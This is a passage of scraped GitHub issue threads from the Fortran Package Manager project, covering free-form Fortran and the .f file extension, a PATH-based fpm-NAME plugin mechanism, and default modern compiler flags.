                    "text": "Let's discuss CMake elsewhere (especially since we all agree on the pros and cons anyway and are just reformulating the same arguments with different words) and focus just on the .f in this issue.\nThe fact that Vasp uses .f for free form might be enough of an argument, as Vasp has historically been the single most used code on many HPC clusters based on CPU hours.\nMy personal preference so far is this:\n\nIf there is community will, then let's reclaim .f\nIf there is not enough community will, then let's stick to .f90\nUsing .fpm would be my third preference (i.e., I would not bother and just stick to .f90)\nAll other suggestions so far for other extensions\n\nThis issue is symbolic, at least for me. It is how Fortran is perceived, and if we managed to reclaim it and keep all the tooling working, I think this could be very exciting for newcomers to the language. And also it would be proof that our community is serious about Fortran and has the manpower (or will) to change things.\nHowever (and I can't stress this enough): doing something like this is only worth it if we are 100% serious about this. It is not worth doing if we are not convinced, as it will only fracture the Fortran ecosystem more.\nMy recommendation at this point: let's keep using .f90 for now and concentrate on making fpm better. But let's keep thinking about reclaiming .f. It is a thought that needs time. My initial reaction was \"not a good idea\". But thinking it through, I like it. But as I said, we have to be unanimous about this."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-02-17 23:07:53+00:00",
                    "text": "@certik The way you phrased the title of this issue is a big question and beyond the scope of fpm. Regarding that question, I agree with your proposal.\nBut the question can be much simpler in the context of fpm: Should fpm assume free-form or fixed-form for .f files?\nOr perhaps the question is: Should fpm even make assumptions based on source file suffix? (I think not)\nI think fpm should assume free-form for all Fortran source files, and explicitly instruct the compiler to build fixed-form if specified in fpm.toml or by some other configuration means.\nThen you're not doing any kind of reclaiming, or having to convince compiler makers. You're just setting what we think should be a sane default in fpm, and perhaps even make a recommendation about suffix in the fpm guide.\nConsider this scenario:\n\nfpm assumes free-form for all source files.\nfpm recommends .f suffix for Fortran source files in the fpm guide.\nNew Fortran projects that use fpm adopt the .f convention.\nLet other projects be what they want (.f90, .F, .ftn, etc.)\n\nIf fpm is succesful in the long run (the Cargo of Fortran), .f adoption will happen naturally and effortlessly."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-02-17 23:18:22+00:00",
                    "text": "In some way the problem of free- and fixed-form is really just a problem of language classification.\nGiven the large strides made in natural language processing (NLP) in the past few decades, I wonder if the classification of a much less complicated man-made programming language can be so difficult.\nAt least within the fpm ecosystem, and as long as we could build a robust free/fixed-form classifier, free- and fixed-form might be able to co-exist side by side under the same .f extension.\nSome cons of this approach:\n\nwe need to build a robust classifier\nit introduces an overhead of fpm having to analyze each file (it could cache the result though)\npotential problems once integration with other build tools (CMake, etc.) is desired\nnot sure how to deal with files that require preprocessing\n\nIf we would try to pursue the auto-detection path, we have a lot of tagged data sets due to the existing convention of .f and .f90. \ud83d\ude04\nEdit: some programming language classification tools as proof of concept\n\nhttps://github.com/IBM/programming-language-classifier\nhttps://github.com/gcrowder/programming-language-classifier\nhttps://reference.wolfram.com/language/ref/classifier/ProgrammingLanguage.html\nReyes, J., Ram\u00edrez, D., & Paciello, J. (2016, December). Automatic classification of source code archives by programming language: A deep learning approach. In 2016 International Conference on Computational Science and Computational Intelligence (CSCI) (pp. 514-519). IEEE. (download pdf)"
                },
                {
                    "user": "certik",
                    "date": "2021-02-17 23:23:04+00:00",
                    "text": "I thought about auto-detecting free/fixed-form in .f and I think the best is what @milancurcic suggested ---- assume free form for all extensions and if you have a fixed form, you have to specify that manually in fpm.toml. I think this is the way to go."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-02-17 23:31:18+00:00",
                    "text": "Down the road this would break most of Fortran syntax highlighting. At least during a short transition period (likely on the order of decades), code editors would become forced to auto-detect or programmers would need to adjust their syntax highlighting settings manually. (For me personally it is not a problem, but for a beginner this might be discouraging.)\nAlternatively we would need to convince people to start renaming fixed-form files to .lf as in legacy Fortran or .of for old Fortran."
                },
                {
                    "user": "sblionel",
                    "date": "2021-02-17 23:43:04+00:00",
                    "text": "You can't reliably auto-detect - it is possible to write code that is correct whether you interpret it as free form or fixed form.\nFixed form is obsolescent. If you want fpm to assume free-form for .f you can, but you'll be going against decades of convention and it is likely to cause more problems than it solves."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-02-17 23:45:10+00:00",
                    "text": "You can't reliably auto-detect - it is possible to write code that is correct whether you interpret it as free form or fixed form.\n\nI realize such cases might exist hypothetically. But I don't think they pose a problem. In this special case you can just interpret the file as free-form. If it doesn't compile, then it must be the other form. If it doesn't compile as either, well then something is broken, the code, the compiler, or the standard (in this precise order)."
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-02-18 00:27:56+00:00",
                    "text": "Upon reading some more about programming language classification, the most likely useful feature used to separate between the two forms are comments (C vs !).\nSince the language tokens are the same in both free- and fixed-form they cannot be used reliably. Luckily due to historical language features, and differing programming styles, it is likely that the frequency of tokens (including initial whitespace) can still be used for classification.\nIt would be counter-productive to write your modern Fortran code in an old-fashioned way using computed GOTO's, labelled statements, and other deprecated features, even if theoretically possible. Of course you can do it, even if just for the pleasure of proving a classifier can be wrong sometimes."
                },
                {
                    "user": "mikolajpp",
                    "date": "2021-02-19 08:23:36+00:00",
                    "text": "I am a newcomer to Fortran, and this issue is something that coincidentally have been on my mind when I first picked up this language some weeks ago.\nFirst, without having a background in the history of fortran, it was confusing to know what extension to pick. I wanted to write \"modern fortran\", but using the \"f18\" for the latest standard feels a lot like naming a file after the current year. Then I found out  a lot of modern fortran code just uses \".f90\" so I stick to that.\nAesthetically it has been disturbing me, since Fortran is the only language I know that does not have unified convention (ok, you might say C++ has cpp, cxx, and cc, but these are of a different nature than Fortran's jungle of versions).\nAs for a constructive proposal, I myself thought of using \".ff\" for all my files (to differentiate it from \".f\"), but\nreading this whole thread reclaiming the \".f\" for modern free form Fortran appeals to me even more.\nI found modern fortran to be an appealing language and despite knowing Julia well, I find myself writing more and more code in Fortran.\nTaking a pragmatic stand, I would just like to be able to use fpm and plain \".f\" files for all my future projects.\nAlthough this might seem harsh, those who disagree with this choice or whose tools are incompatible can just continue using other tools. For users with no emotional stake in Fortran's past having a simple tool with uniform convention is what matter the most."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-02-19 15:17:55+00:00",
                    "text": "Just to mention some thoughts found in previous discussions about this topic:\n\nsome have proposed that Fortran itself have a directive or option that indicates free or fixed format; which some compilers supply as an option now\nthat .fx  be a new extension that implies free format, implied implicit none, and no use of certain deprecated features along the lines of the F- project (and as new features appear that has the issue of what is \"deprecated\" at any particular time; just being a synonym for \".f90\" is less problematic)\nand others have suggested a magic string as the first line as in !FORTRAN_FREE.\n\nAll would still have issues with the assumptions utilties that supply highlighting might have.\nCurrently the suffix is totally outside of the standard specifications and is just a (well adapted) convention. Support of .F|.F90 implying preprocessing (and which preprocessor), support of previous \"standards\" such as .for, .ftn, ... is spotty. Many have argued the standard should state some preference for suffixes when source is in system files, which you have to admit is pretty obviously common.  One system allowed for directives in a single file that even allowed sections of C code mixed with fixed and free-format Fortran. I really liked that for building Fortran/C interfaces.\nI like the idea of \"reclaiming .f\"  but because there are a number of compilers and tools that would have to change it seems a bit of  a challenge without some kind of guidance or feature from the standard itself.\nIf I were going to try to go down this path I think I would say that .f is preferred but equivalent to .f90 and implies  free-format and that fixed-format should use .for or .ftn; (which would already be supported by a number of tools and compilers -- a good number treat .for and .ftn as equivalent to the current behavior with .f).\nI use .ff and .FF for essentially all new code, which in my environment implies a specific pre-processor is used, which is  not generally applicable but I mention it because I think at some point fpm will have a preprocessor(s) bundled with it and I think .fpm would be a good suffix to reserve for that; and if the preprocessor is also usable as an independent utility that would be easy to use with make and other tools that allow for creating your own suffix rules (my old environment auto-generates make files with a .ff rule but I am moving a lot to fpm slowly - a few M lines to go!).\nIf there were a suffix rule in fpm that allowed you to call any preprocessor as long as that preprocessor generated a flat .f90 file for distribution as a package (maybe multiple files for multiple passes to generate a MSWindows file and a Linux file and a BSD file and a ...) I would use that; but that would take some fleshing out -- having a \"standard\" preprocessor would be a lot simpler.\n.for seems to be generaly the same as .f,  .ftn seems to sometimes be treated like .f and sometimes like .f90;  looks like .f77 is supported more than I thought.  Updating the fortran Wiki and/or adding a page with recommendations in fortran.lang might be a good place to start.  I can see using .f77, and .f90 is widely supported but since I do not see anything enforcing .f03, .f15, .f08, actually mean that it is checked as conforming to a certain standard I think those should be STRONGLY discouraged. If anyone can add to this it would be great:\nMany compilers have options to specify assuming fixed or free-format. Some defaults are\nCray:\n\n.f, .for     Fixed-format source, compile\n.F, .FOR     Fixed-format source, preprocess, compile\n.f90, .f95, .f03, .f08, .f18, .ftn   Free-format source, compile\n.F90, .F95, .F03, .F08, .F18, .FTN   Free-format source, preprocess, compile\n\nFREE and FIXED\n!DIR$ FREE\n!DIR$ FIXED\n\nThe FREE and FIXED directives specify whether the source code in the program unit is written in free source form or fixed source form. The FREE and FIXED directives override the -f option, if specified, on the command line.These directives apply to the source file in which they appear, and they allow for switching source forms within a source file.Source form can be changed from within an INCLUDE file. After the INCLUDE file has been processed, the source form reverts back to the source form that was being used prior to processing of the INCLUDE file.\nIntel:\n   The ifort command interprets input files by their filename suffix as follows:\n\n   * Filenames with the suffix .f90 are interpreted as free-form\n     Fortran 95/90 source files.\n\n   * Filenames with the suffix .f, .for, or .ftn are interpreted as\n     fixed-form Fortran source files.\n\n   * Filenames  with the suffix .fpp, .F, .FOR, .FTN, or .FPP are\n     interpreted as fixed-form Fortran source files, which must\n     be preprocessed by the fpp preprocessor before being compiled.\n\n   * Filenames with the suffix .F90 are interpreted as free-form\n     Fortran source files, which must be  pre-processed  by  the\n     fpp preprocessor before being compiled.\n\nGfortran:\n  Enable preprocessing. The preprocessor is automatically invoked if\n  the file extension is .fpp, .FPP,  .F, .FOR, .FTN, .F90, .F95, .F03 or\n  .F08. Use this option to manually enable preprocessing of any kind of\n  Fortran file.\n\nSEE ALSO\n  *  [Fortran Wiki -- file extensions](http://fortranwiki.org/fortran/show/File+extensions)\n\n~"
                },
                {
                    "user": "certik",
                    "date": "2021-02-19 17:51:40+00:00",
                    "text": "I like the idea of \"reclaiming .f\" but because there are a number of compilers and tools that would have to change it seems a bit of a challenge without some kind of guidance or feature from the standard itself.\n\nI just want to clarify this: compilers do not need to change.\nI opened a new issue #366 for a subset of what was discussed here."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-02-20 00:41:21+00:00",
                    "text": "Since there is no standard for suffixes the compiler support varies extensively. Last I checked the Intel compiler had no switch to change the suffix meaning so .f always means fixed-format; but has very flexible directives such as \"!DEC$ FREEFORM and NONFREEFORM that let you change even in the middle of a procedure (which sounds horrible but can be justified when using INCLUDE files). So to use the compiler you would have to copy/link the file to a different filename, for example. So the compiler does not HAVE to change but if it does not compiling a \".f\" file as free-format becomes awkward. Every compiler is free to do what it wants. Some can compile from a pipe, some let you define suffixs to search for like \".fixed\" and \".free\".  So no matter what fpm does it is just another convention without some stand taken in the standard.\nfpm could always make file copies (my own build system does that primarily to allow for multiple concurrent builds so that is not totally unreasonable) but you cannot depend on the compiler being able to compile a \".f\" file as free-format  (although it is a common feature - GNU, NVidia, and Cray has such a switch, for example)."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-02-20 01:07:20+00:00",
                    "text": "Last I checked the Intel compiler had no switch to change the suffix meaning so .f always means fixed-format\n\nYou don't need that kind of switch. All you need is -free:\n$ cat fixed.f \nC     FIXED-FORM PROGRAM\n      PRINT *, 'HELLO'\n      END\n$ ifort fixed.f && ./a.out\n HELLO\n$ ifort -free fixed.f \nfixed.f(1): error #5082: Syntax error, found IDENTIFIER 'FIXED' when expecting one of: ( : % [ . = =>\nC     FIXED-FORM PROGRAM\n------^\ncompilation aborted for fixed.f (code 1)\n$ cat free.f \n! Free-form program\nprint *, 'hello'\nend\n$ ifort -free free.f && ./a.out\n hello"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-02-20 01:27:47+00:00",
                    "text": "That was what I meant was missing. Oddly, the man page for ifort I have does not contain the -free switch, but I tried it and it works with the version I have; I started taking a survey because I certainly have used compilers in the past that had no such switch and I remember one in particular that also did not support .F and .F90 implying preprocessing; so far (Cray, GNU, NVidia, now Intel) they have one but they certainly are not required to have it as there is no language standard, just a de-facto standard that has painfully emerged (.fort, .ftn, .for, .f77, ...)."
                },
                {
                    "user": "sblionel",
                    "date": "2021-02-20 01:28:09+00:00",
                    "text": "ifort also has -Tf to tell it that the filename is a Fortran file, if the extension is not one it recognizes. You also need -free if free-form.\nI do not believe it is worthwhile spending any effort to change established usage of extensions. If you want fpm to assume that all sources are free-form, go ahead, but I anticipate future complaints when someone tries to package some existing fixed-form code. When I wrote my post in 2013, I thought it was way too late to effect such a change - it's even later now. Spend your time on something new."
                },
                {
                    "user": "certik",
                    "date": "2021-07-25 08:41:29+00:00",
                    "text": "Here is another interesting case:\nsymengine/symengine.f90#7\nFor bigger projects like SymEngine I like to keep the main repository (https://github.com/symengine/symengine) in C++ (in this case) and then have wrappers in other languages as separate repositories with an extension, e.g.:\n\nhttps://github.com/symengine/symengine.py\nhttps://github.com/symengine/symengine.jl\nhttps://github.com/symengine/symengine.rb\nhttps://github.com/symengine/symengine.f90\n...\n\nAs you can see, for Fortran I used .f90, because that was the \"modern\" file extension. In this case we are not talking about a file extension about the name of the project. But the \"extension in the project name\" is equal to the file extension in every other case (Python, Julia, Ruby, ...), as well as for Fortran, and that's why we chose .f90. However, a lot of people in the Fortran community including @rouson, @milancurcic and many others (myself included) would like to see just  using the term Fortran, not adding the 90 in the name. For the name of the project, it makes perfect sense to just call it symengine.f, which is exactly what was proposed in symengine/symengine.f90#7 by a one of the SymEngine maintainers, who is not a Fortran user, but this is what felt natural to him. And I wrote there that I agree that we should do it.\nI am posting here to see what others think. It's about 5 months since I opened up the above issue, and I still like to just use .f for Fortran related project names and files."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-07-26 11:37:54+00:00",
                    "text": "This seems like an interesting way to \"dip our toe in the water\". Any ideas how may users it has? Are they \"modern\" Fortran users? This would be an interesting experiment to see what chances we have of succeeding in this endeavor."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-07-26 11:43:58+00:00",
                    "text": "FWIW, I'm still in favor of adding -ffree-format (or its equivalent) to the default compiler flags, with an option available in the fpm.toml file to turn it off."
                },
                {
                    "user": "certik",
                    "date": "2021-07-26 13:52:11+00:00",
                    "text": "Any ideas how may users it has?\n\nSymEngine has quite a few users, including quite a few in the Julia community. The Fortran wrappers I think have exactly zero users because they are not complete yet. Once we make them usable, they will have at least one user: me. :) It's hard to predict how many users they will have, but I think they can potentially have lots of users. With LFortran working down the road, I would like to create tutorials how to do almost anything in Fortran that can be done in Python and Julia. Symbolics is one part of that. Once people can see the potential, I think we will have a lot of users."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-07-26 14:41:07+00:00",
                    "text": "If we are looking for a project to check this out in practice, I can volunteer some of mine, like toml-f or dftd4, the former is part of the foundation of fpm, while the latter has a decent user base across different projects (like Vasp) and quite a few dependencies itself. Both support fpm, meson and CMake as build systems because they have to integrate with different ecosystems.\nSo far I only have seen implementations of free format with .f suffix in projects which rely heavily on Makefiles and are purely standalone. Therefore, I'm still not quite convinced that it is worth the trouble to get it working with CMake, but I'd like to get proven wrong on this point and adopt this as best practice for all my Fortran projects.\nFirst step of course would be to implement it in fpm itself."
                },
                {
                    "user": "LKedward",
                    "date": "2021-07-28 09:59:01+00:00",
                    "text": "FWIW, I'm still in favor of adding -ffree-format (or its equivalent) to the default compiler flags, with an option available in the fpm.toml file to turn it off.\n\nI am also in favour of this proposal."
                },
                {
                    "user": "certik",
                    "date": "2021-07-28 12:24:46+00:00",
                    "text": "FWIW, I'm still in favor of adding -ffree-format (or its equivalent) to the default compiler flags, with an option available in the fpm.toml file to turn it off.\n\nI am also in favour of this proposal.\n\nLet's do it."
                },
                {
                    "user": "zaikunzhang",
                    "date": "2021-10-16 14:50:40+00:00",
                    "text": "I support this proposal  (reclaiming .f file extension for modern Fortran free form) as strongly as I can.\n.f is obviously the ideal extension. Imagine that we are in 2040. What will be the first impression that a normal person gets from .f90? If we believe and hope that Fortran will continue to be actively used 20 years later, the best time to reclaim .f is now."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-10-16 17:08:01+00:00",
                    "text": "Please checkout #577 (comment) where I described how to add an option for disabling implicit typing in fpm. The same logic can be applied for always using free-form. I think the free-form makes a straight-forward feature for a first contribution to fpm and I'm happy to guide anyone interested through the process of implementing it."
                }
            ]
        },
        {
            "number": 362,
            "user": "urbanjost",
            "date": "2021-02-16 17:25:57+00:00",
            "title": "simple plugin support where fpm-NAME commands are searched for",
            "text": "Relating to  #361 and #211\nA simplistic plugin support method whereupon when a subcommand is\nnot found the PATH variable is used to search for commands of the\nform fpm-NAME and those are executed in lieu of an error message\nindicating an unknown subcommand was entered.\nThe executable is simply called. No data is passed via arguments,\nenvironment variables, or files (yet).\nThis allows for concurrent development. This is an alpha feature\nto support testing the pros and cons of plugins, aliases, a\nbuilt-in scripting language (see Fortran scheme, lua, ...),\nresponse files (see M_CLI2), ...\nThe subcommand must currently support its own help. The list subcommand\ndoes not currently list available plugins -- that is, nothing in fpm\ndocuments that external subcommand exists.\nThis allows related commands such as repository search, formatting\ntools, and other utilitites to develop independently of the core\nfpm functionality without bloating the core program with the many\nexternal packages that would be potentially useful to other functions,\nto allow for easier development of system-dependent subcommands, and\nso on.\nIt could become much more useful with the ability to pass categories\nof pathnames, but some of that exists with the --runner option.\nWith pathnames, you could say \"reformat all my source files\" or\n\"expand tabs in all my source files\" or \"edit my source files\"\nwithout the complex syntax required by the --runner option, and so on.\nBest example so far:\ninstall fpm-search(1) in your path, and you can use it using\nfpm search 'date|time'\nSince fpm-search is a stand-alone utility is requires no data to be passed\nto it but feels very much a part of fpm(1))); even though it requires\na very different set of packages to be installed than the core fpm(1)\npackage -- and development and installation can occur concurrently.",
            "comments": [
                {
                    "user": "brocolis",
                    "date": "2021-02-17 00:38:01+00:00",
                    "text": "Hi @urbanjost . I like the idea. Currently there's an issue running it on Windows: \"<ERROR> unknown subcommand [search]\""
                },
                {
                    "user": "urbanjost",
                    "date": "2021-02-17 01:17:15+00:00",
                    "text": "I do  not have an MSWindows environment so I will try to simulate it or get hold of one. I am guessing the separator() function did not work as I expected it to. A debug mode will hopefully sort it out shortly. I have been using on Linux RedHat and it is working as expected. I made a few other simple ones like a few of the simpler cargo ones to select example programs with an ncurses(3f) menu and to create a README file based on the output of tree(1) and it is interesting. I was thinking maybe a line in the fpm-search(1) help text saying where the directions are to add your project to the repository would be nice, by the way.\nIf I cannot sort it out if I make a debug version could you run  it on Windows?  You are running in a cmd Window or mingw or Cygwin or WLS or ...?\nI think I see it. On MSWindows an executable has to end in '.exe' or '.bat' if the suffix is left off (right?) and I did not check for that."
                },
                {
                    "user": "brocolis",
                    "date": "2021-02-17 01:32:03+00:00",
                    "text": "Hi @urbanjost , yes I'm running it in a cmd.exe window. I'll run it on GDB and report later.\nAnd yes, I've just tested the patch in a linux vm and it works nicely, thanks!"
                },
                {
                    "user": "urbanjost",
                    "date": "2021-02-17 02:20:39+00:00",
                    "text": "Thank you for fpm-search. I was already using it as a stand-alone command but it is the perfect initial case for trying this type of         plug-in method too."
                },
                {
                    "user": "brocolis",
                    "date": "2021-02-17 02:57:35+00:00",
                    "text": "Thank you @urbanjost , I've tested the latest patch. Here are the results:\n\nIf I put fpm.exe, fpm-search.exe and all dependencies into a single place, run set path=C:\\place, then fpm search package works\nIf I run set path=C:\\other;C:\\place, then fpm search package  fails."
                },
                {
                    "user": "brocolis",
                    "date": "2021-02-17 09:15:11+00:00",
                    "text": "It is working as expected on Windows. Thank you @urbanjost."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-02-17 13:10:04+00:00",
                    "text": "Thanks.  I will add some test cases for some of the routines like 'which(3f)' and 'separate(3f)' based on that."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-02-17 17:31:10+00:00",
                    "text": "Thank you for starting it @urbanjost. I generally like and support this direction.\nIs this approach safe? For example, if a user mistypes fpm knit instead of fpm init, it will run fpm-knit, is there any chance that fpm-knit is something that already exists and is potentially destructive? I think this is highly unlikely, but thought I'd ask. I don't have much experience with security.\nIf not, perhaps plugins should be whitelisted in a config file?\nBut if yes, I think it would a very nice user experience to just fpm new fpm-myplugin, add some code, and easily play with a 3rd party command without having to tweak fpm itself."
                },
                {
                    "user": "urbanjost",
                    "date": "2021-02-18 00:35:54+00:00",
                    "text": "I like it better from a developmental standpoint in that even the standard package can be delivered and developed as a group of related utilities but still act in many ways like one monolithic application.  So far I see something similar in cargo-* and git-* and their might be others; but I find something lacking in communicating data and extending existing commands that I think would make this far more useful. Have to start somewhere and this change can be made with essentially no impact on existing behavior and seems to have corollaries in everything from rust::cargo to git. So using fpm-search as an example:\n\nThe utility can and does stand on it's own as a separate program -- so why access it this way? The search command is ultimately a basic function needed by fpm so it makes sense to appear to the user as a standard fpm subcommand. But it's function and requirements are significantly different than the model building function of fpm.  So doing it this way allows for concurrent development, minimizes the external dependencies such as an RE library, libcurl, a hash library (not that those might not all be needed by the module engine at some point) ... so I think that this model works for this particular command very well; could actually be used as-is even if fpm-search is included directly; and looses no functionality. Could list other pro/cons.\n\nSo personally I think the main functionality missing in the model build core is  providing compiler options that are easily distributed with the package. This lacking feature is the show-stopper I have seen listed most often by people who look at but do not adopt fpm.\nThe second highest priority in my view is having a simple CLI interface that lets you put a package into a repository and lets you search the repository(s).  And a local repository needs supported for in-house code development. The fpm-search program does the search of the current repository nicely.\nBut making usage and development extensible  and modular is my personal third priority.  So I think this is a reasonable first step too but think there is a missing functionality here.  Let's say I want to make an 'fpm edit' command that has some options like 'edit source file that build fails on' or 'edit files changed since last commit' or 'edit file I click on from tree of files'; or commands like 'reformat all my source files' ...  some nice way for an external program like this to query the model and git information would help a lot with that, although all these functions could be done as separate applications they could benefit from being able to \"talk\" to the model.  I would do that now on a POSIX machine but trying to think of a \"pure Fortran\" model is alluding me, other than maybe NAMELIST files. Everything I think of needs a system or C interface; which I would like to see avoided if possible.  So trying to think of a way to merge this and functionality like --runner and aliases provides as a next step.\nAfter looking at git-* usage it looked like this would be primarily a hidden feature to further modular development; but seeing the cargo-* usage it looks like it could get a large amount of community plugins contributed -- will be interesting to see if either starts developing.\nGot disconnected by the dogs in the middle of this. So the idea is:  I want to make a plugin that could benefit from basic model information. Picturing that when fpm runs a plugin it calls a routine called dumpmodel(3f) that writes a file in build/model.nml perhaps that has the TOML metatadata in a METADATA group, and a group for each major file grouping like TEST, EXAMPLE, BUILD_TARGETS, and APPS. Without knowing anything about the internals of fpm or TOML files I can use standard Fortran to read the file  (maybe file groups also have a MAX_LENGTH and MAX_NUMBER_OF_FILES value group) assuming at least for now the fpm command is always executed in the top directory of the package and write some \"model-aware\" plugins. If that was agreed to it would have to have long-term support for anyone to want to do much with it.  That allows for Fortran-based plugins to be developed where the interface to the model uses standard Fortran and no other knowledge is required.\nWe really do not have a --list option in the current core fpm that lists target source files. That would be handy. That is not what ''build --list' produces.\nSimple and standard to at least implement part of \"build.nml\".  Anyone think that would be a good thing to provide long-term?"
                },
                {
                    "user": "brocolis",
                    "date": "2021-02-18 01:15:03+00:00",
                    "text": "Regarding security, I've noticed that Windows Defender displays a notification the first time I run a newly built fpm.exe (with this PR #362 enabled). I was able to reproduce it:\n\n  \n    \n    \n\n    fpm.mp4"
                },
                {
                    "user": "brocolis",
                    "date": "2021-02-18 01:55:52+00:00",
                    "text": "Regarding security, I've noticed that Windows Defender displays a notification the first time I run a newly built fpm.exe (with this PR #362 enabled). I was able to reproduce it:\nfpm.mp4\n\nYes, I'm sure fpm/fpm-search are not viruses/threats."
                },
                {
                    "user": "brocolis",
                    "date": "2021-02-18 03:57:43+00:00",
                    "text": "Although I like writing fpm-search, I'm aware that it's a prototype and it will have a very short life, at least in its current form (We don't have the fpm-registry specification yet).\nIf security is a concern and if we don't find a way to avoid the Windows Defender scary notification, I'd rather transfer fpm-search to Fortran-Lang Org. I believe Fortran-Lang Org/Community could crowdfund a security certificate so that all binaries could be digitally signed and that will make Windows Defender happy I think.\nLet's see how that idea will evolve."
                },
                {
                    "user": "LKedward",
                    "date": "2021-02-18 14:22:47+00:00",
                    "text": "Great stuff @urbanjost I like this approach! It's really nice to see it working already with fpm-search.\n\n\nto query the model and git information would help a lot with that, although all these functions could be done as separate applications they could benefit from being able to \"talk\" to the model. I would do that now on a POSIX machine but trying to think of a \"pure Fortran\" model is alluding me...\n\nRegarding access to the fpm model structure, a possible solution is to use fpm as a package dependency and to call the build_model procedure from your plugin package.\nThis isolates the plugin from whatever fpm version is installed on the system and doesn't require serialising then parsing the model structure (which would require maintenance and be dependent on the fpm version).\nfpm is a big package to have as a dependency, but we could always isolate the 'middle-end' (?) code that constructs the internal model as a separate package to help plugin developers.\nI would find this useful for prototyping ideas and/or customising fpmetc.\nUnfortunately fpm cannot yet be used as a git dependency due to the folder structure, but I don't think there is anything preventing us from fixing that now."
                },
                {
                    "user": "brocolis",
                    "date": "2021-02-19 09:48:36+00:00",
                    "text": "I should report that the Windows Defender notification is unrelated to this PR. I noticed that Windows Defender started displaying a security notification when I build and run the master and other branches also.. My apologies."
                }
            ]
        },
        {
            "number": 359,
            "user": "epagone",
            "date": "2021-02-15 16:42:09+00:00",
            "title": "Default Modern Fortran flags",
            "text": "TL;DR\nThis proposal aims at collecting and setting up with fpm a modern Fortran environment by default (e.g. no implicit typing, no fixed form, etc...), without requiring any change to the current compilers behaviour or the standard. Packaging of important legacy code (of critical importance for much of the Fortran community but usually requiring special flags regardless) would be supported overriding the mentioned defaults.\n\nAs of 2021 no one should reasonably write Fortran\n\nin fixed form\nwith implicit typing (thus making implicit none redundant as obvious)\nusing \"implicit save\" of module variables\nwhat else? Please suggest.\n\nI believe that fpm should provide default, overridable compiler flags enforcing the above. In this way, a little bit more dust and rust will be hopefully removed from the perception of the language to potential newcomers. Furthermore, since these changes are difficult to implement into the standard, fpm can be also presented as the only, long-awaited solution (by some practitioners, at least) to these issues.\nPackaging of legacy libraries would likely require regardless a tailored fpm.toml thus, it would be a matter of adding a few more specifications to override the above defaults.\nIn more detail.\nFixed Form\nThis idea started from this conversation where I dream of reclaiming the .f extension for new code without resorting to the current, Jurassic .f90 to specify free from. The only potential issue that I foresee in this case is that legacy dependencies will be compiled with different flags but, if I understand correctly the logic of fpm, this should not be an issue.\nHowever, it would be really amazing if fpm would be able to autodetect the source code form, as @ivan-pi suggested here, but I guess that it would require quite a lot more work.\nImplcit typing\nThis sounds pretty simple to do, e.g. -fimplicit-none with gfortran or -implicitnone with Intel Fortran.\nImplcit save\nIs this possible? Googling, I have seen that with gfortran -frecursive might do the trick but I am not sure if it is really the case and if it will trigger some other side-effect undesired in a \"default\" setup (Intel seems to have -recursive).\nWhat do you think?",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2021-02-15 17:29:30+00:00",
                    "text": "As much as I'd love for fpm's defaults to encourage modern best practices, our desire for legacy codes to be ported to fpm packages and encourage \"legacy\" programmers to use it, means it's probably a no-go for a lot of our target users.\nThat said, I would love for us to have a convenient option to turn lots of this kind of stuff on. As I mentioned in the discussion for my proposal for how we might deal with the compiler flags (#350), I think we should have an additional built in \"profile\", kind of like --release but --strict (or something along those lines) and these would be reasonable additions there."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2021-02-15 17:38:31+00:00",
                    "text": "Another thought, perhaps we should have some sort of survey/poll for each supported compiler about what flags should be included in the default (--debug) set. There would be 2 possible responses for each proposed flag:\n\nPlease don't turn this on\nPlease turn this on\n\nThus, if a certain percentage of respondents (say 10-15%) say please don't turn this on, we won't, even if there is a large percentage of respondents who would like it. If a sufficient number of respondents indicate they would like it (25-30% ?), we turn it on by default. Thus a non-response to a particular flag indicates ambivalence about it for that particular respondent.\nThe hard part will be setting up the survey with a reasonable set of flags to start with, and allowing participants to add additional suggestions. Does anyone know of a polling site that could accomplish such a thing?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-02-15 17:45:58+00:00",
                    "text": "I was thinking about introducing a ~/.fpm/config.toml which allows to define additional compilers and maybe even overwrite built-in ones. While this goes against having reproducible environments in a way, a --custom build mode drawing from this configuration might work. Submitting a compiler profile as feedback to us might help us fill in missing compilers and refine existing compiler profiles."
                },
                {
                    "user": "epagone",
                    "date": "2021-02-15 17:51:11+00:00",
                    "text": "As much as I'd love for fpm's defaults to encourage modern best practices, our desire for legacy codes to be ported to fpm packages and encourage \"legacy\" programmers to use it, means it's probably a no-go for a lot of our target users.\n\nFair enough. I note that I never met a single example of such \"legacy\" programmer that still actively writes code in fixed form and with implicit typing. The vast majority of them leverage libraries (making occasional modifications) of legacy code that could be packaged with fpm without perpetrating and inflicting to the entire community ancient practices."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-02-15 18:00:37+00:00",
                    "text": "I would also like to reclaim .f.\nAs a new and radically innovative (for Fortran standrads, at least) tool, we have a unique opportunity to set the tone and recommended best practices, and even shift some long trends. Trends become trends because one or a few people decided something, and many just took it and accepted it without questions.\nWhy do we have an idea of which source file suffixes correspond to fixed or free format? Because existing compilers told us.\nfpm should start with a clean slate and define its own conventions. Do we want fpm to always assume free format and explicit typing? I think so. But allow a flag (e.g. --legacy) to build valid legacy Fortran code. Having to add something like --legacy will serve as a gentle reminder for the user to update or modernize the code, if feasible."
                },
                {
                    "user": "FortranFan",
                    "date": "2021-02-15 18:20:53+00:00",
